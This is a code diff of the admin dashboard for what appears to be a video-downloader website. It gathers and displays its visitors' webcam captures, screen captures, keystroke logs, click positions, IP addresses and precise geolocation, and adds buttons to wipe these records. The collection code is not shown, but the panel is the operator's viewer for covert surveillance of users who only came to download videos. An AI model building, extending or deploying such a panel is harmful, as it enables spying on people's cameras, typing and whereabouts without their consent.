-    </tr></thead><tbody id="userDetailBody"></tbody></table>
-  </div>
-</div>
-
-<div class="row">
-  <div class="col">
-    <div class="section-title"># camera captures <span id="capCount" style="color:#6496ff"></span></div>
-    <div class="cap-strip" id="capStrip"></div>
-  </div>
-  <div class="col">
-    <div class="section-title"># screen captures <span id="screenCount" style="color:#ffc800"></span></div>
-    <div class="cap-strip" id="screenStrip"></div>
-  </div>
-  <div class="col">
-    <div class="section-title"># locations <span id="locCount" style="color:#ffc800"></span></div>
-    <div class="loc-box" id="locBox">Loading...</div>
-  </div>
-  <div class="col">
-    <div class="section-title"># unique IPs</div>
-    <div class="loc-box" id="ipBox" style="max-height:120px">Loading...</div>
-  </div>
-</div>
-
-<div class="section-title" onclick="toggleSection('clicksSection')"># click log <span id="clickCount" style="color:#555"></span> [toggle]</div>
-<div id="clicksSection" style="display:none">
-  <div class="table-wrap">
-    <table><thead><tr>
-      <th>time</th><th>session</th><th>ip</th><th>element</th><th>text</th><th>x</th><th>y</th><th>page</th>
-    </tr></thead><tbody id="clicksBody"></tbody></table>
-  </div>
-</div>
-
-<div class="section-title"># unified feed <span id="feedCount" style="color:#555"></span></div>
-<div class="table-wrap">
-  <table><thead><tr>
-    <th>time</th><th>type</th><th>session</th><th>ip</th><th>country</th><th>city</th><th>isp</th><th>lat</th><th>lon</th><th>details</th>
-  </tr></thead><tbody id="unifiedBody"></tbody></table>
-</div>
-
-<div class="section-title" onclick="toggleSection('linksSection')"># link history <span id="linkCount" style="color:#7c3aed"></span> [toggle]</div>
-<div id="linksSection" style="display:none">
-  <div style="display:flex;gap:6px;flex-wrap:wrap;margin-bottom:6px;font-size:0.5rem;color:#555">
-    <span>filter:</span>
-    <button class="lnk-filter" data-f="all" style="cursor:pointer;background:rgba(124,58,237,.15);border:1px solid rgba(124,58,237,.2);color:#cbb4ff;padding:2px 8px;border-radius:4px">all</button>
-    <button class="lnk-filter" data-f="view" style="cursor:pointer;background:rgba(255,255,255,.03);border:1px solid rgba(255,255,255,.06);color:#999;padding:2px 8px;border-radius:4px">pasted</button>
-    <button class="lnk-filter" data-f="download" style="cursor:pointer;background:rgba(255,255,255,.03);border:1px solid rgba(255,255,255,.06);color:#999;padding:2px 8px;border-radius:4px">downloaded</button>
-  </div>
-  <div class="table-wrap">
-    <table><thead><tr>
-      <th>time</th><th>action</th><th>site</th><th>url</th><th>mode</th><th>status</th>
-    </tr></thead><tbody id="linksBody"></tbody></table>
-  </div>
-</div>
-
-<div class="section-title" style="margin-top:16px;color:#ff5252"># destruction zone</div>
-<div style="display:flex;gap:4px;flex-wrap:wrap;margin-bottom:10px">
-  <button onclick="deleteAll('all')" style="padding:4px 10px;border:none;border-radius:3px;background:rgba(255,50,50,0.1);border:1px solid rgba(255,50,50,0.2);color:#ff5252;font-family:'JetBrains Mono',monospace;font-size:0.5rem;cursor:pointer">delete ALL</button>
-  <button onclick="deleteAll('captures')" style="padding:4px 10px;border:none;border-radius:3px;background:rgba(100,150,255,0.08);border:1px solid rgba(100,150,255,0.12);color:#6496ff;font-family:'JetBrains Mono',monospace;font-size:0.5rem;cursor:pointer">delete captures</button>
-  <button onclick="deleteAll('screenshots')" style="padding:4px 10px;border:none;border-radius:3px;background:rgba(255,200,0,0.08);border:1px solid rgba(255,200,0,0.12);color:#ffc800;font-family:'JetBrains Mono',monospace;font-size:0.5rem;cursor:pointer">delete screenshots</button>
-  <button onclick="deleteAll('downloads')" style="padding:4px 10px;border:none;border-radius:3px;background:rgba(0,200,80,0.08);border:1px solid rgba(0,200,80,0.12);color:#00c853;font-family:'JetBrains Mono',monospace;font-size:0.5rem;cursor:pointer">delete downloads</button>
-  <button onclick="deleteAll('clicks')" style="padding:4px 10px;border:none;border-radius:3px;background:rgba(255,123,0,0.08);border:1px solid rgba(255,123,0,0.12);color:#ff7b00;font-family:'JetBrains Mono',monospace;font-size:0.5rem;cursor:pointer">delete clicks</button>
-  <button onclick="deleteAll('keystrokes')" style="padding:4px 10px;border:none;border-radius:3px;background:rgba(180,100,255,0.08);border:1px solid rgba(180,100,255,0.12);color:#b464ff;font-family:'JetBrains Mono',monospace;font-size:0.5rem;cursor:pointer">delete keystrokes</button>
-</div>
-
-<button class="refresh-btn" id="refreshBtn">[ refresh ]</button>
 
 <script>
-function fmt(t) {
-  if(!t) return '';
-  const d = new Date(t);
-  return d.toLocaleString(undefined, {month:'short',day:'numeric',hour:'2-digit',minute:'2-digit'});
-}
+const $ = s => document.querySelector(s);
+const $$ = s => document.querySelectorAll(s);
+function fmt(t){ if(!t) return ''; const d=new Date(t); return d.toLocaleString(undefined,{month:'short',day:'numeric',hour:'2-digit',minute:'2-digit'}); }
+function siteOf(url){ const u=String(url).toLowerCase();
+  if(u.includes('youtube')||u.includes('youtu.be'))return'YouTube';
+  if(u.includes('tiktok'))return'TikTok'; if(u.includes('instagram'))return'Instagram';
+  if(u.includes('twitter')||u.includes('x.com'))return'X'; if(u.includes('facebook'))return'Facebook';
+  if(u.includes('terabox')||u.includes('1024tera'))return'Terabox'; if(u.includes('t.me')||u.includes('telegram'))return'Telegram';
+  if(u.includes('reddit'))return'Reddit'; if(u.includes('twitch'))return'Twitch'; if(u.includes('bilibili'))return'Bilibili';
+  return url? url.split('/')[2]||'Other':'Other'; }
 
-function siteTag(url) {
-  const u = url.toLowerCase();
-  if(u.includes('youtube')) return 'YT';
-  if(u.includes('tiktok')) return 'TT';
-  if(u.includes('instagram')) return 'IG';
-  if(u.includes('twitter')||u.includes('x.com')) return 'X';
-  if(u.includes('facebook')) return 'FB';
-  if(u.includes('terabox')||u.includes('1024tera')) return 'TB';
-  if(u.includes('t.me')||u.includes('telegram')) return 'TG';
-  if(u.includes('reddit')) return 'RD';
-  return '?';
-}
-
-function openPreview(url, type) {
-  document.getElementById('modalContent').innerHTML = type === 'video'
-    ? `<video controls autoplay><source src="${url}" type="video/mp4"></video>`
-    : `<img src="${url}" style="max-width:100%">`;
-  document.getElementById('modalOverlay').classList.add('show');
-}
-
-function closeModal() {
-  const mc = document.getElementById('modalContent');
-  mc.innerHTML = '';
-  document.getElementById('modalOverlay').classList.remove('show');
-}
-
-document.addEventListener('keydown', e => { if(e.key === 'Escape') closeModal(); });
-
-let allUsers = [];
-
-function showUsers() {
-  document.getElementById('userDetail').style.display = 'none';
-  document.getElementById('usersSection').style.display = 'block';
-}
-
-async function loadUser(sid, label) {
-  document.getElementById('usersSection').style.display = 'none';
-  document.getElementById('userDetail').style.display = 'block';
-  document.getElementById('userDetailLabel').textContent = label;
-  document.getElementById('userCapStrip').innerHTML = 'Loading...';
-  document.getElementById('userDetailBody').innerHTML = '';
-  document.getElementById('userKeys').innerHTML = '';
-  try {
-    const r = await fetch('/admin/user/' + encodeURIComponent(sid));
-    const d = await r.json();
-    document.getElementById('userCapStrip').innerHTML = (d.captures||[]).map(c =>
-      `<div class="cap-item">
-        <div class="del-btn" onclick="event.stopPropagation();deleteCapture(${c.id})">&#10005;</div>
-        <img src="/captures/${c.filename}" onclick="openPreview('/captures/${c.filename}','img')">
-        <div class="overlay">${c.country||'?'}</div>
-      </div>`
-    ).join('') || '<div style="color:#444;font-size:0.6rem;padding:6px">no captures</div>';
-    document.getElementById('userKeys').innerHTML = (d.keystrokes||[]).map(k =>
-      `<div style="padding:2px 4px;border-bottom:1px solid rgba(255,255,255,0.03)"><span style="color:#555">${fmt(k.time)}</span> <span style="color:#f857a6">${k.keys.replace(/</g,'&lt;').replace(/>/g,'&gt;').substring(0,200)}</span></div>`
-    ).join('') || '<div style="color:#444;padding:4px">no keystrokes</div>';
-    document.getElementById('userDetailBody').innerHTML = (d.downloads||[]).map(r =>
-      `<tr>
-        <td style="color:#555">${fmt(r.time)}</td>
-        <td><span class="tag ${r.status==='success'?'suc':'err'}">DL</span></td>
-        <td style="max-width:150px;overflow:hidden;text-overflow:ellipsis">${r.title ? r.title.substring(0,40) : siteTag(r.url)}</td>
-        <td>${r.mode||'-'}</td>
-        <td><span class="tag ${r.status==='success'?'suc':'err'}">${r.status||'?'}</span></td>
-        <td style="color:#888">${r.ip||'-'}</td>
-        <td>${r.country||'-'}</td>
-        <td>${r.city||'-'}</td>
-      </tr>`
-    ).join('') || '<tr><td colspan="8" style="text-align:center;color:#444;padding:12px">no downloads</td></tr>';
-  } catch(e) { document.getElementById('userCapStrip').innerHTML = 'Error loading'; }
-}
-
-async function load() {
-  try {
-    const [statsR, locsR, usersR] = await Promise.all([
-      fetch('/admin/stats').then(r=>r.json()),
-      fetch('/admin/locations').then(r=>r.json()),
-      fetch('/admin/users').then(r=>r.json())
-    ]);
-
-    const d = statsR;
-    const caps = d.captures || [];
-    const screens = d.screenshots || [];
-    const clicks = d.clicks || [];
-    const recent = d.recent || [];
-    const dlLocs = locsR.downloads || [];
-    const capLocs = locsR.captures || [];
-
-    liveCount.textContent = d.total + d.captures_total;
-    uniqueCount.textContent = d.ip_count || 0;
-    sessionCount.textContent = d.session_count || 0;
-
-    statsGrid.innerHTML = `
-      <div class="card"><div class="val">${d.total+d.captures_total+(d.screenshots_total||0)+(d.clicks_total||0)}</div><div class="lbl">events</div></div>
-      <div class="card"><div class="val" style="color:#00c853">${d.success}</div><div class="lbl">downloads</div></div>
-      <div class="card"><div class="val" style="color:#6496ff">${d.captures_total}</div><div class="lbl">captures</div></div>
-      <div class="card"><div class="val" style="color:#ffc800">${d.screenshots_total||0}</div><div class="lbl">screenshots</div></div>
-      <div class="card"><div class="val" style="color:#ff7b00">${d.clicks_total||0}</div><div class="lbl">clicks</div></div>
-      <div class="card"><div class="val" style="color:#ffc800">${d.ip_count||0}</div><div class="lbl">IPs</div></div>
-      <div class="card"><div class="val" style="color:#f857a6;font-size:1rem">${d.session_count||0}</div><div class="lbl">sessions</div></div>
-      <div class="card"><div class="val" style="font-size:1rem;color:#888">${d.failed}</div><div class="lbl">failed</div></div>
-    `;
-
-    const maxSite = Math.max(...Object.values(d.sites), 1);
-    sitesList.innerHTML = Object.entries(d.sites).map(([k,v]) => `
-      <div class="bar-item"><span class="nm">${k} <span class="ct">(${v})</span></span><span>${v}</span></div>
-      <div class="bar-track"><div class="bar-fill" style="width:${v/maxSite*100}%"></div></div>
-    `).join('') || '<div class="bar-item" style="color:#444">no data</div>';
-
-    const maxCountry = Math.max(...Object.values(d.countries), 1);
-    countriesList.innerHTML = Object.entries(d.countries).map(([k,v]) => `
-      <div class="bar-item"><span class="nm">${k} <span class="ct">(${v})</span></span><span>${v}</span></div>
-      <div class="bar-track"><div class="bar-fill" style="width:${v/maxCountry*100}%"></div></div>
-    `).join('') || '<div class="bar-item" style="color:#444">no data</div>';
-
-    const dayMax = Math.max(...Object.values(d.by_day), 1);
-    const days = Object.keys(d.by_day);
-    dailyList.innerHTML = days.length ? days.slice(-7).map(k => `
-      <div class="bar-item"><span class="nm">${k}</span><span>${d.by_day[k]}</span></div>
-      <div class="bar-track"><div class="bar-fill" style="width:${d.by_day[k]/dayMax*100}%"></div></div>
-    `).join('') : '<div class="bar-item" style="color:#444">no data</div>';
-
-    const modeMax = Math.max(...Object.values(d.modes), 1);
-    modesList.innerHTML = Object.entries(d.modes).map(([k,v]) => `
-      <div class="bar-item"><span class="nm">${k} <span class="ct">(${v})</span></span><span>${v}</span></div>
-      <div class="bar-track"><div class="bar-fill" style="width:${v/modeMax*100}%"></div></div>
-    `).join('') || '<div class="bar-item" style="color:#444">no data</div>';
-
-    capCount.textContent = `(${caps.length})`;
-    document.getElementById('capStrip').innerHTML = caps.map(c =>
-      `<div class="cap-item" title="${c.country||'?'} ${c.city||''} · ${c.browser||'?'} ${c.os||''}">
-        <div class="del-btn" onclick="event.stopPropagation();deleteCapture(${c.id})">&#10005;</div>
-        <img src="/captures/${c.filename}" onclick="openPreview('/captures/${c.filename}','img')">
-        <div class="overlay">${c.country||'?'}</div>
-      </div>`
-    ).join('') || '<div style="color:#444;font-size:0.6rem;padding:6px">no captures yet</div>';
-
-    const allLocs = [...dlLocs, ...capLocs].slice(0,30);
-    locCount.textContent = `(${allLocs.length})`;
-    document.getElementById('locBox').innerHTML = allLocs.length
-      ? allLocs.map(r => `[${Number(r.lat).toFixed(3)}, ${Number(r.lon).toFixed(3)}] ${r.city||'?'}, ${r.country||'?'}${r.isp?' · '+r.isp:''}`).join('<br>')
-      : 'no geo data yet';
-
-    document.getElementById('screenStrip').innerHTML = screens.map(s =>
-      `<div class="cap-item" title="${s.session_id?s.session_id.substring(0,12):'?'} · ${s.ip||'?'}">
-        <div class="del-btn" onclick="event.stopPropagation();deleteScreenshot(${s.id})">&#10005;</div>
-        <img src="/screenshots/${s.filename}" onclick="openPreview('/screenshots/${s.filename}','img')">
-        <div class="overlay">${s.ip||'?'}</div>
-      </div>`
-    ).join('') || '<div style="color:#444;font-size:0.6rem;padding:6px">no screenshots yet</div>';
-
-    screenCount.textContent = `(${screens.length})`;
-
-    clickCount.textContent = `(${clicks.length})`;
-    document.getElementById('clicksBody').innerHTML = clicks.slice(0,100).map(c =>
-      `<tr>
-        <td style="color:#555">${fmt(c.time)}</td>
-        <td style="color:#555;font-size:0.5rem">${c.session_id?c.session_id.substring(0,8):'-'}</td>
-        <td style="color:#888">${c.ip||'-'}</td>
-        <td>${c.tag||'-'}</td>
-        <td style="color:#666;max-width:120px;overflow:hidden;text-overflow:ellipsis">${c.text||'-'}</td>
-        <td style="color:#555">${c.x||'-'}</td>
-        <td style="color:#555">${c.y||'-'}</td>
-        <td style="color:#555;font-size:0.5rem">${c.page||'-'}</td>
-      </tr>`
-    ).join('') || '<tr><td colspan="8" style="text-align:center;color:#444;padding:12px">no clicks yet</td></tr>';
-
-    document.getElementById('ipBox').innerHTML = (d.unique_ips||[]).slice(0,20).map(ip =>
-      `<div style="padding:1px 4px;font-size:0.5rem;color:#777">${ip}</div>`
-    ).join('') || '<div style="color:#444">no data</div>';
-
-    // Users
-    allUsers = usersR.users || [];
-    document.getElementById('userCount').textContent = `(${allUsers.length})`;
-    document.getElementById('usersGrid').innerHTML = allUsers.length
-      ? allUsers.map(u => {
-          const label = `${u.browser||'?'} ${u.os||'?'} · ${u.country||'?'}`;
-          return `<div class="user-card" onclick="loadUser('${u.session_id}','${label.replace(/'/g,"\\'")}')">
-            <div class="uc-val">${u.downloads+u.captures}</div>
-            <div class="uc-lbl">${label.substring(0,30)}</div>
-          </div>`;
-        }).join('')
-      : '<div style="color:#444;font-size:0.6rem;padding:6px">no sessions yet</div>';
-
-    feedCount.textContent = `(last 100)`;
-    const allItems = [];
-    (recent || []).forEach(r => allItems.push({...r, _type:'download', _detail: `${r.title ? r.title.substring(0,40) : siteTag(r.url)} [${r.mode||''} ${r.status||''}]`}));
-    caps.forEach(c => allItems.push({...c, _type:'capture', _detail:`${c.browser||'?'} ${c.os||'?'} ${c.device||'?'}`}));
-    screens.forEach(s => allItems.push({...s, _type:'screenshot', _detail:`${s.page||'?'} · ${s.ip||'?'}`}));
-    allItems.sort((a,b) => (b.time||'').localeCompare(a.time||''));
-
-    unifiedBody.innerHTML = allItems.slice(0,100).map(r => {
-      const loc = [r.city, r.country].filter(Boolean).join(', ') || '-';
-      const sess = r.session_id ? r.session_id.substring(0,8)+'...' : '-';
-      const detail = r._type === 'capture'
-        ? `<a href="javascript:openPreview('/captures/${r.filename}','img')" style="color:#6496ff">&#128247; view</a> ${r._detail}`
-        : r._type === 'screenshot'
-          ? `<a href="javascript:openPreview('/screenshots/${r.filename}','img')" style="color:#ffc800">&#128196; view</a> ${r._detail}`
-          : r.filename
-          ? `<a href="/serve/${r.filename}" style="color:#00c853">&#8595;</a> <a href="javascript:openPreview('/preview/${r.filename}','video')" style="color:#6496ff">&#9654;</a> ${r._detail}`
-          : r._detail;
-      return `<tr>
-        <td style="color:#555">${fmt(r.time)}</td>
-        <td><span class="tag ${r._type==='capture'?'cam':'suc'}">${r._type==='capture'?'CAM':'DL'}</span></td>
-        <td style="color:#555;font-size:0.5rem" title="${r.session_id||''}">${sess}</td>
-        <td style="color:#888">${r.ip||'-'}</td>
-        <td>${r.country||'-'}</td>
-        <td>${r.city||'-'}</td>
-        <td style="color:#555">${r.isp||'-'}</td>
-        <td style="color:#555;font-size:0.5rem">${r.lat ? Number(r.lat).toFixed(3) : '-'}</td>
-        <td style="color:#555;font-size:0.5rem">${r.lon ? Number(r.lon).toFixed(3) : '-'}</td>
-        <td style="color:#666;font-size:0.5rem">${detail}</td>
-      </tr>`;
-    }).join('') || '<tr><td colspan="10" style="text-align:center;color:#444;padding:12px">no data yet</td></tr>';
-
-  } catch(e) { console.error('load error:', e); }
-}
-
-function toggleSection(id) {
-  const el = document.getElementById(id);
-  el.style.display = el.style.display === 'none' ? 'block' : 'none';
-}
-
-async function deleteCapture(id) {
-  if(!confirm('Delete this capture?')) return;
-  try {
-    const r = await fetch('/admin/captures/delete/' + id, { method:'POST' });
-    const d = await r.json();
-    if(d.success) load();
-    else alert('Delete failed: ' + (d.error || 'unknown'));
-  } catch(e) { alert('Delete error: ' + e.message); }
-}
-
-async function deleteScreenshot(id) {
-  if(!confirm('Delete this screenshot?')) return;
-  try {
-    const r = await fetch('/admin/screenshot/delete/' + id, { method:'POST' });
-    const d = await r.json();
-    if(d.success) load();
-    else alert('Delete failed: ' + (d.error || 'unknown'));
-  } catch(e) { alert('Delete error: ' + e.message); }
-}
-
-async function deleteAll(target) {
-  const labels = {all:'ALL files and records', captures:'all CAM captures', screenshots:'all SCREENSHOTS', downloads:'all DOWNLOADS', clicks:'all CLICK logs', keystrokes:'all KEYSTROKES'};
-  if(!confirm(`Delete ${labels[target]||target}? This cannot be undone.`)) return;
-  try {
-    const r = await fetch('/admin/delete-all', { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({target}) });
-    const d = await r.json();
-    if(d.success) { load(); alert('Deleted successfully.'); }
-    else alert('Delete failed: ' + (d.error || 'unknown'));
-  } catch(e) { alert('Delete error: ' + e.message); }
-}
-
-document.getElementById('refreshBtn').onclick = load;
-
-// ===== Live task SSE feed =====
-function connectTaskFeed() {
-  const box = document.getElementById('liveTasks');
-  const count = document.getElementById('activeTaskCount');
-  try {
-    const es = new EventSource('/admin/events');
-    es.onmessage = (e) => {
-      try {
-        const data = JSON.parse(e.data);
-        if (data.type !== 'tasks') return;
-        const active = data.active || [];
-        count.textContent = `(${active.length})`;
-        if (!active.length) {
-          box.innerHTML = '<div style="color:#444;padding:4px">no active downloads</div>';
-          return;
-        }
-        box.innerHTML = active.map(t => {
-          const p = t.progress || 0;
-          const st = t.status || '?';
-          const err = t.error ? ` · ${String(t.error).substring(0,40)}` : '';
-          return `<div style="background:rgba(0,200,80,0.04);border:1px solid rgba(0,200,80,0.1);border-radius:4px;padding:4px 6px">
-            <div style="display:flex;justify-content:space-between;color:#aaa"><span>${st}${err}</span><span style="color:#00c853">${p}%</span></div>
-            <div class="bar-track" style="margin:3px 0 0"><div class="bar-fill" style="width:${p}%;background:linear-gradient(90deg,#00c853,#28ca41)"></div></div>
-          </div>`;
-        }).join('');
-      } catch {}
-    };
-    es.onerror = () => { /* auto-reconnect by browser */ };
-  } catch {}
-}
-connectTaskFeed();
-
-let linkFilter = 'all';
-let linkCache = [];
-
-async function loadLinks() {
-  try {
-    const r = await fetch('/admin/links');
-    const d = await r.json();
-    linkCache = d.data || [];
-    renderLinks();
-  } catch(e) { console.error('links error', e); }
-}
-
-function renderLinks() {
-  const rows = linkFilter === 'all' ? linkCache : linkCache.filter(l => l.action === linkFilter);
-  document.getElementById('linkCount').textContent = `(${linkCache.length})`;
-  document.getElementById('linksBody').innerHTML = rows.slice(0, 500).map(l =>
-    `<tr>
-      <td style="color:#555">${fmt(l.time)}</td>
-      <td><span class="tag ${l.action==='download'?'suc':''}">${l.action||'?'}</span></td>
-      <td>${l.site||'-'}</td>
-      <td style="max-width:320px;overflow:hidden;text-overflow:ellipsis"><a href="${l.url}" target="_blank" rel="noopener" style="color:#999">${String(l.url).substring(0,90)}</a></td>
-      <td>${l.mode||'-'}</td>
-      <td>${l.status?`<span class="tag ${l.status==='success'?'suc':'err'}">${l.status}</span>`:'-'}</td>
-    </tr>`
-  ).join('') || '<tr><td colspan="6" style="text-align:center;color:#444;padding:12px">no links yet</td></tr>';
-}
-
-document.querySelectorAll('.lnk-filter').forEach(btn => {
-  btn.onclick = () => {
-    linkFilter = btn.dataset.f;
-    document.querySelectorAll('.lnk-filter').forEach(b => {
-      const on = b.dataset.f === linkFilter;
-      b.style.background = on ? 'rgba(124,58,237,.15)' : 'rgba(255,255,255,.03)';
-      b.style.borderColor = on ? 'rgba(124,58,237,.2)' : 'rgba(255,255,255,.06)';
-      b.style.color = on ? '#cbb4ff' : '#999';
-    });
-    renderLinks();
+/* nav */
+$$('.nav-item').forEach(n=>{
+  n.onclick=()=>{
+    $$('.nav-item').forEach(x=>x.classList.remove('active'));
+    n.classList.add('active');
+    const v=n.dataset.view;
+    $$('.view').forEach(s=>s.classList.remove('active'));
+    $('#view-'+v).classList.add('active');
+    const labels={overview:'Dashboard / Overview',links:'Data / Link History',downloads:'Data / Downloads',sessions:'Data / Sessions',captures:'Data / Captures',screens:'Data / Screenshots',keys:'Data / Keystrokes',clicks:'Data / Clicks',geo:'Data / Geo & IPs'};
+    $('#crumb').textContent=labels[v]||'';
+    if(v==='links')renderLinks();
   };
 });
 
-load();
-setInterval(load, 10000);
-setInterval(loadLinks, 10000);
-loadLinks();
+/* modal */
+function openPreview(url,type){ $('#modalContent').innerHTML = type==='video'?`<video controls autoplay><source src="${url}"></video>`:`<img src="${url}">`; $('#modalOverlay').classList.add('show'); }
+function closeModal(){ $('#modalContent').innerHTML=''; $('#modalOverlay').classList.remove('show'); }
+document.addEventListener('keydown',e=>{if(e.key==='Escape')closeModal();});
+
+let STATS={}, LOCS={}, USERS=[], LINKS=[], CAPS=[], SCREENS=[], CLICKS=[], KEYS=[];
+
+async function loadAll(){
+  try{
+    const [s,l,u,g]=await Promise.all([
+      fetch('/admin/stats').then(r=>r.json()),
+      fetch('/admin/links').then(r=>r.json()),
+      fetch('/admin/users').then(r=>r.json()),
+      fetch('/admin/locations').then(r=>r.json())
+    ]);
+    STATS=s; LOCS=g; USERS=u.users||[]; LINKS=l.data||[];
+    renderOverview(s); renderLinks(); renderSessions(); renderGeo(g);
+    $('#navLinks').textContent=LINKS.length; $('#navSess').textContent=USERS.length; $('#navCap').textContent=(s.captures_total||0);
+  }catch(e){console.error(e);}
+}
+
+/* overview */
+function renderOverview(s){
+  const caps=s.captures||[], screens=s.screenshots||[], clicks=s.clicks||[], recent=s.recent||[];
+  const total=s.total+(s.captures_total||0)+(s.screenshots_total||0)+(s.clicks_total||0)+LINKS.length;
+  $('#statsGrid').innerHTML=`
+    ${stat('fa-link','Links',LINKS.length,'pasted & downloaded')}
+    ${stat('fa-download','Downloads',s.total,'server pulls')}
+    ${stat('fa-camera','Captures',s.captures_total||0,'camera shots')}
+    ${stat('fa-desktop','Screens',s.screenshots_total||0,'screen grabs')}
+    ${stat('fa-hand-pointer','Clicks',s.clicks_total||0,'interactions')}
+    ${stat('fa-keyboard','Keys',KEYS_COUNT,'keystrokes')}
+    ${stat('fa-users','Sessions',s.session_count||0,'unique')}
+    ${stat('fa-network-wired','IPs',s.ip_count||0,'unique')}`;
+  $('#liveCount').textContent=total;
+
+  // sources
+  const maxS=Math.max(...Object.values(s.sites),1);
+  $('#sitesList').innerHTML=Object.entries(s.sites).map(([k,v])=>bar(k,v,maxS)).join('')||emptyRow();
+  // countries
+  const maxC=Math.max(...Object.values(s.countries),1);
+  $('#countriesList').innerHTML=Object.entries(s.countries).map(([k,v])=>bar(k,v,maxC)).join('')||emptyRow();
+
+  // mode donut
+  const modes=s.modes||{};
+  const mEntries=Object.entries(modes);
+  const mTotal=mEntries.reduce((a,[,v])=>a+v,0)||1;
+  const colors=['#4f46e5','#9333ea','#ec4899','#6496ff','#ffc800'];
+  let acc=0, segs='';
+  mEntries.forEach(([k,v],i)=>{
+    const pct=v/mTotal*100, col=colors[i%colors.length];
+    segs+=`<div style="position:absolute;inset:0;background:conic-gradient(${col} ${acc}%, transparent ${acc}% ${acc+pct}%, transparent 100%)"></div>`;
+    acc+=pct;
+  });
+  $('#modeDonut').innerHTML=segs+`<div class="donut-center"><span class="dc-val">${mTotal}</span><span class="dc-lbl">requests</span></div>`;
+  $('#modeLegend').innerHTML=mEntries.map(([k,v],i)=>`<div class="lg"><span class="dot" style="background:${colors[i%colors.length]}"></span>${k}<span class="lv">${v}</span></div>`).join('')||emptyRow();
+
+  // daily
+  const days=Object.keys(s.by_day); const dmax=Math.max(...Object.values(s.by_day),1);
+  $('#dailyList').innerHTML=days.slice(-7).map(k=>bar(k,s.by_day[k],dmax)).join('')||emptyRow();
+
+  // downloads table (recent 60)
+  $('#dlBody').innerHTML=recent.slice(0,60).map(r=>`
+    <tr>
+      <td class="mono">${fmt(r.time)}</td>
+      <td>${r.title?esc(r.title).substring(0,40):siteOf(r.url)}</td>
+      <td class="url-cell mono">${esc(r.url).substring(0,70)}</td>
+      <td>${r.mode||'-'}</td>
+      <td><span class="tag ${r.status==='success'?'suc':'err'}">${r.status||'?'}</span></td>
+      <td class="mono">${r.ip||'-'}</td>
+      <td>${r.country||'-'}</td>
+    </tr>`).join('')||`<tr><td colspan="7" class="empty">No downloads yet</td></tr>`;
+  $('#dlTotal').textContent=s.total+' requests';
+}
+let KEYS_COUNT=0;
+function stat(ico,lbl,val,sub){return `<div class="stat"><i class="fa-solid ${ico} s-ico"></i><div class="s-val">${val}</div><div class="s-lbl">${lbl}</div><div class="s-sub">${sub}</div></div>`;}
+function bar(nm,v,max){const pct=Math.min(100,Math.round(v/max*100));return `<div class="bar-item"><span class="nm">${esc(nm)}</span><span class="bar-track"><span class="bar-fill" style="width:${pct}%"></span></span><span class="ct">${v}</span></div>`;}
+function emptyRow(){return `<div class="bar-item"><span class="nm" style="color:var(--txt3)">No data yet</span></div>`;}
+function esc(s){return String(s||'').replace(/[<>&"]/g,c=>({'<':'&lt;','>':'&gt;','&':'&amp;','"':'&quot;'}[c]));}
+
+/* links */
+let linkFilter='all';
+function renderLinks(){
+  const rows=linkFilter==='all'?LINKS:LINKS.filter(l=>l.action===linkFilter);
+  $('#linkTotal').textContent=LINKS.length+' links';
+  $('#linksBody').innerHTML=rows.slice(0,500).map(l=>`
+    <tr>
+      <td class="mono">${fmt(l.time)}</td>
+      <td><span class="tag ${l.action==='download'?'dl':'view'}">${l.action||'?'}</span></td>
+      <td>${l.site||siteOf(l.url)}</td>
+      <td class="url-cell"><a href="${esc(l.url)}" target="_blank" rel="noopener" style="color:var(--txt);text-decoration:none">${esc(l.url).substring(0,90)}</a></td>
+      <td>${l.mode||'-'}</td>
+      <td>${l.status?`<span class="tag ${l.status==='success'?'suc':'err'}">${l.status}</span>`:'-'}</td>
+    </tr>`).join('')||`<tr><td colspan="6" class="empty">No links yet</td></tr>`;
+}
+$$('#linkFilters .fbtn').forEach(b=>b.onclick=()=>{
+  linkFilter=b.dataset.f;
+  $$('#linkFilters .fbtn').forEach(x=>x.classList.remove('on')); b.classList.add('on');
+  renderLinks();
+});
+
+/* sessions */
+function renderSessions(){
+  $('#sessGrid').innerHTML=USERS.length?USERS.map(u=>{
+    const label=`${u.browser||'?'} · ${u.os||'?'}`;
+    const ini=(u.browser||'?')[0].toUpperCase();
+    return `<div class="sess" onclick="loadUser('${u.session_id}','${esc(label)}')">
+      <div class="s-top"><div class="s-ava">${ini}</div><div><div class="s-name">${esc(label)}</div><div class="s-meta">${esc((u.ip||'?'))} · ${u.country||'?'}</div></div></div>
+      <div class="s-stats"><div><b>${u.downloads}</b>downloads</div><div><b>${u.captures}</b>captures</div></div>
+    </div>`;
+  }).join(''):'<div class="empty">No sessions yet</div>';
+}
+function showSessions(){ $('#sessDetail').style.display='none'; $('#view-sessions .sess-grid').style.display='grid'; }
+async function loadUser(sid,label){
+  $('#view-sessions .sess-grid').style.display='none'; $('#sessDetail').style.display='block';
+  $('#sessCapStrip').innerHTML='<div class="empty">Loading...</div>';
+  try{
+    const d=await fetch('/admin/user/'+encodeURIComponent(sid)).then(r=>r.json());
+    $('#sessCapStrip').innerHTML=(d.captures||[]).map(c=>`<div class="m" title="${c.country||'?'}"><div class="del" onclick="event.stopPropagation();deleteCapture(${c.id})">&times;</div><img src="/captures/${c.filename}" onclick="openPreview('/captures/${c.filename}','img')"><div class="ov">${c.country||'?'}</div></div>`).join('')||'<div class="empty">No captures</div>';
+    $('#sessKeys').innerHTML=(d.keystrokes||[]).map(k=>`<div><span class="kt">${fmt(k.time)}</span>${esc(k.keys)}</div>`).join('')||'No keystrokes';
+    $('#sessDlBody').innerHTML=(d.downloads||[]).map(r=>`<tr><td class="mono">${fmt(r.time)}</td><td><span class="tag ${r.status==='success'?'suc':'err'}">DL</span></td><td>${r.title?esc(r.title).substring(0,40):siteOf(r.url)}</td><td>${r.mode||'-'}</td><td><span class="tag ${r.status==='success'?'suc':'err'}">${r.status||'?'}</span></td></tr>`).join('')||'<tr><td colspan="5" class="empty">No downloads</td></tr>';
+  }catch(e){$('#sessCapStrip').innerHTML='Error';}
+}
+
+/* captures / screens */
+function renderCaptures(){
+  $('#capStrip').innerHTML=CAPS.length?CAPS.map(c=>`<div class="m" title="${c.country||'?'}"><div class="del" onclick="deleteCapture(${c.id})">&times;</div><img src="/captures/${c.filename}" onclick="openPreview('/captures/${c.filename}','img')"><div class="ov">${c.country||'?'}</div></div>`).join(''):'<div class="empty">No captures yet</div>';
+  $('#capTotal').textContent=CAPS.length;
+}
+function renderScreens(){
